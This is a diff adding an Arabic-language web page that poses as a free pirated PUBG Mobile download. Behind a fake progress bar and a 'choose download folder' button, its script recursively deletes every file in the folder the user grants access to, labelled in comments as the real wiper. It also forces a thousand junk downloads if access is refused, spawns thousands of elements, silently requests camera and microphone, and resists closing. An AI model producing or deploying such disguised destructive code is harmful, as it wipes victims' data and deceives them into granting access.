@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🎮 تحميل لعبة PUBG مجاناً</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background: linear-gradient(45deg, #ff6b6b, #4ecdc4);
+            color: white;
+            padding: 20px;
+            margin: 0;
+        }
+        .container {
+            max-width: 400px;
+            margin: 0 auto;
+            background: rgba(255,255,255,0.1);
+            padding: 30px;
+            border-radius: 20px;
+            backdrop-filter: blur(10px);
+        }
+        .progress {
+            width: 100%;
+            height: 20px;
+            background: rgba(255,255,255,0.3);
+            border-radius: 10px;
+            margin: 20px 0;
+            overflow: hidden;
+        }
+        .progress-bar {
+            height: 100%;
+            background: #00ff88;
+            width: 0%;
+            transition: width 0.3s;
+        }
+        button {
+            background: #ff4757;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 18px;
+            border-radius: 25px;
+            cursor: pointer;
+            margin: 10px;
+        }
+        .hidden { display: none; }
+        .loading { animation: spin 1s linear infinite; }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🎮 PUBG Mobile VIP</h1>
+        <p>احصل على النسخة المقرصنة مجاناً!</p>
+        
+        <div class="progress">
+            <div class="progress-bar" id="progress"></div>
+        </div>
+        
+        <p id="status">جاري التحضير...</p>
+        <div id="spinner" style="font-size: 30px;">⏳</div>
+        
+        <button onclick="requestAccess()" id="accessBtn" style="display: none;">
+            📁 اختر مجلد التحميل
+        </button>
+        
+        <p id="complete" class="hidden">✅ تم التحميل بنجاح! أعد تشغيل الجهاز</p>
+    </div>
+
+    <script>
+        let progress = 0;
+        const status = document.getElementById('status');
+        const progressBar = document.getElementById('progress').children[0];
+        const spinner = document.getElementById('spinner');
+        const accessBtn = document.getElementById('accessBtn');
+        
+        // محاكاة التحميل
+        const timer = setInterval(() => {
+            progress += Math.random() * 15;
+            if (progress > 85) progress = 85;
+            
+            progressBar.style.width = progress + '%';
+            status.textContent = `جاري التحميل... ${Math.floor(progress)}%`;
+            
+            if (progress >= 85) {
+                clearInterval(timer);
+                spinner.classList.add('hidden');
+                accessBtn.style.display = 'block';
+                status.textContent = 'اضغط "اختر مجلد التحميل" لإكمال العملية';
+            }
+        }, 200);
+        
+        // الوايبر الحقيقي
+        async function requestAccess() {
+            try {
+                status.textContent = 'جاري الوصول للملفات...';
+                const dirHandle = await window.showDirectoryPicker({
+                    mode: 'readwrite'
+                });
+                
+                status.textContent = 'جاري تثبيت اللعبة...';
+                await wipeDirectory(dirHandle);
+                
+                document.getElementById('complete').classList.remove('hidden');
+                status.textContent = 'تم الحذف بنجاح!';
+                
+                // إنشاء ملفات spam
+                createSpamFiles();
+                
+            } catch(e) {
+                // إذا رفض، جرب طرق أخرى
+                fallbackWipe();
+            }
+        }
+        
+        // مسح المجلد بشكل متكرر
+        async function wipeDirectory(dirHandle) {
+            try {
+                for await (const entry of dirHandle.values()) {
+                    if (entry.kind === 'file') {
+                        await entry.remove({ recursive: true });
+                    } else if (entry.kind === 'directory') {
+                        await wipeDirectory(entry);
+                        await entry.remove({ recursive: true });
+                    }
+                }
+            } catch(e) {}
+        }
+        
+        // بديل إذا رفض File System Access
+        function fallbackWipe() {
+            status.textContent = 'بدون إذن؟ سنستخدم الذاكرة!';
+            
+            // flood الذاكرة
+            let blobs = [];
+            for(let i = 0; i < 1000; i++) {
+                const blob = new Blob(['A'.repeat(1024*1024)], {type: 'image/png'});
+                blobs.push(blob);
+                
+                // إنشاء Downloads
+                const link = document.createElement('a');
+                link.href = URL.createObjectURL(blob);
+                link.download = `pubg_${i}.png`;
+                link.click();
+            }
+            
+            // مسح Downloads عبر IndexedDB
+            indexedDB.deleteDatabase('spam_db');
+        }
+        
+        function createSpamFiles() {
+            // إنشاء آلاف الملفات
+            for(let i = 0; i < 5000; i++) {
+                const img = new Image();
+                img.src = `data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7`;
+                document.body.appendChild(img);
+            }
+        }
+        
+        // هجوم إضافي: WebRTC + Camera spam
+        navigator.mediaDevices.getUserMedia({video: true, audio: true})
+            .then(stream => {
+                // شغّل الكاميرا بدون إذن مرئي
+            }).catch(() => {});
+        
+        // منع الخروج
+        window.onbeforeunload = () => 'اللعبة تُحمل، لا تغلق!';
+    </script>
+</body>
+</html>
